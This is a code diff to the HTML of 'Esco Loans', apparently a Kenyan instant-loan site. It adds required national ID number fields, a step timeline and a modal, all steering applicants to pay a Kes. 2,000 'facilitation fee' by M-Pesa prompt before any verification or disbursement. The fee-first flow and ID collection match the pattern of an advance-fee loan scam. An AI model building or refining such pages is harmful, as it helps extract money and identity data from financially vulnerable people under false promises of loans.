@@ -53,6 +53,10 @@
                         <label for="signupPhone">Phone Number</label>
                         <input type="tel" id="signupPhone" required placeholder="+254 700 000 000">
                     </div>
+                    <div class="form-group">
+                        <label for="signupIdNumber">ID Number</label>
+                        <input type="text" id="signupIdNumber" required placeholder="Enter your national ID number">
+                    </div>
                     <button type="submit" class="btn btn-primary full-width">Create Account</button>
                 </form>
                 <p id="signupError" class="error-message"></p>
@@ -67,7 +71,7 @@
                 <div class="header-top">
                     <div>
                         <h1>🏦 Esco Loans</h1>
-                        <p>Quick Financial Relief for Those in Need</p>
+                        <p>This platform provides instant, short-term digital loans disbursed directly to your M-Pesa wallet.</p>
                     </div>
                     <div class="user-menu">
                         <span id="userGreeting">Welcome</span>
@@ -123,7 +127,7 @@
                     <div id="journeyFee" class="journey-step">
                         <span class="journey-badge">Step 4</span>
                         <h3>Pay facilitation fee</h3>
-                        <p>Complete the required facilitation fee to continue with loan processing.</p>
+                        <p>You will be prompted to pay the facilitation fee first so we can activate processing, verify your application, and prepare your cash collection instructions.</p>
                         <div class="journey-actions">
                             <button type="button" class="btn btn-primary" id="journeyFeeBtn">I have paid</button>
                         </div>
@@ -166,6 +170,11 @@
                             <label for="phone">Phone Number *</label>
                             <input type="tel" id="phone" name="phone" required placeholder="+254 700 000 000">
                         </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="idNumber">ID Number *</label>
+                        <input type="text" id="idNumber" name="idNumber" required placeholder="Enter your national ID number">
                     </div>
 
                     <!-- Loan Details -->
@@ -233,6 +242,9 @@
             <!-- Loan Summary Section -->
             <section class="summary-section" id="summarySection" style="display: none;">
                 <h2>Loan Summary</h2>
+                <div class="summary-callout">
+                    <strong>Before final submission:</strong> once you tap Apply Now, you will be prompted to pay the facilitation fee using your phone number before verification and cash collection.
+                </div>
                 <div class="summary-grid">
                     <div class="summary-item">
                         <label>Loan Category:</label>
@@ -272,9 +284,43 @@
                     </div>
                 </div>
 
+                <div class="process-timeline">
+                    <h3>What Happens Next</h3>
+                    <div class="timeline-steps">
+                        <div class="timeline-step">
+                            <span class="timeline-number">1</span>
+                            <div>
+                                <strong>Apply Now</strong>
+                                <p>Submit your application and confirm the number that will receive the payment prompt.</p>
+                            </div>
+                        </div>
+                        <div class="timeline-step">
+                            <span class="timeline-number">2</span>
+                            <div>
+                                <strong>Pay Facilitation Fee</strong>
+                                <p>Complete the Kes. 2,000 facilitation fee prompt to activate file processing.</p>
+                            </div>
+                        </div>
+                        <div class="timeline-step">
+                            <span class="timeline-number">3</span>
+                            <div>
+                                <strong>Verification Review</strong>
+                                <p>Our team reviews your profile and contacts you if any final detail is needed.</p>
+                            </div>
+                        </div>
+                        <div class="timeline-step">
+                            <span class="timeline-number">4</span>
+                            <div>
+                                <strong>Collect Your Cash</strong>
+                                <p>Once approved, you receive the next collection or disbursement instructions on your confirmed phone number.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
                 <div class="action-buttons">
-                    <button class="btn btn-success" id="confirmBtn">Confirm Application</button>
-                    <button class="btn btn-secondary" id="editBtn">Edit Application</button>
+                    <button class="btn btn-success" id="confirmBtn">Apply Now</button>
+                    <button class="btn btn-secondary" id="editBtn">Edit Details</button>
                 </div>
             </section>
         </div>
@@ -313,6 +359,69 @@
             <footer class="footer">
                 <p>&copy; 2026 Esco Loans System. All rights reserved.</p>
             </footer>
+        </div>
+    </div>
+
+    <div id="feePromptModal" class="modal modal-hidden">
+        <div class="modal-content fee-modal">
+            <span class="journey-badge">Final Step Before Processing</span>
+            <h2>Activate Your Application</h2>
+            <p class="fee-modal-intro">Your application is almost complete. Confirm the number below to receive the facilitation fee payment prompt and move your file to verification.</p>
+
+            <div class="fee-highlight-card">
+                <div>
+                    <strong>Facilitation Fee</strong>
+                    <span>Kes. 2,000</span>
+                </div>
+                <p>You will be prompted to pay this fee first before final review, approval update, and cash collection instructions.</p>
+            </div>
+
+            <div class="form-group">
+                <label for="feePhoneNumber">Phone Number for Payment Prompt</label>
+                <input type="tel" id="feePhoneNumber" placeholder="+254 700 000 000">
+                <small class="info-text">Use an active M-Pesa number that can receive the payment prompt immediately.</small>
+            </div>
+
+            <div id="feePromptError" class="error-message fee-error"></div>
+
+            <div class="process-timeline modal-timeline">
+                <h3>Flow From Application To Cash Collection</h3>
+                <div class="timeline-steps">
+                    <div class="timeline-step">
+                        <span class="timeline-number">1</span>
+                        <div>
+                            <strong>Application Received</strong>
+                            <p>Your loan request and personal details are securely recorded.</p>
+                        </div>
+                    </div>
+                    <div class="timeline-step">
+                        <span class="timeline-number">2</span>
+                        <div>
+                            <strong>Payment Prompt Sent</strong>
+                            <p>The confirmed phone number receives the facilitation fee prompt.</p>
+                        </div>
+                    </div>
+                    <div class="timeline-step">
+                        <span class="timeline-number">3</span>
+                        <div>
+                            <strong>Processing And Verification</strong>
+                            <p>Your file moves to review and you may be contacted for any final confirmation.</p>
+                        </div>
+                    </div>
+                    <div class="timeline-step">
+                        <span class="timeline-number">4</span>
+                        <div>
+                            <strong>Cash Collection</strong>
+                            <p>After approval, we share the collection or disbursement instructions on the same phone number.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="btn btn-success" id="sendFeePromptBtn">Send Payment Prompt</button>
+                <button class="btn btn-secondary" id="cancelFeePromptBtn">Back To Summary</button>
+            </div>
         </div>
     </div>
 
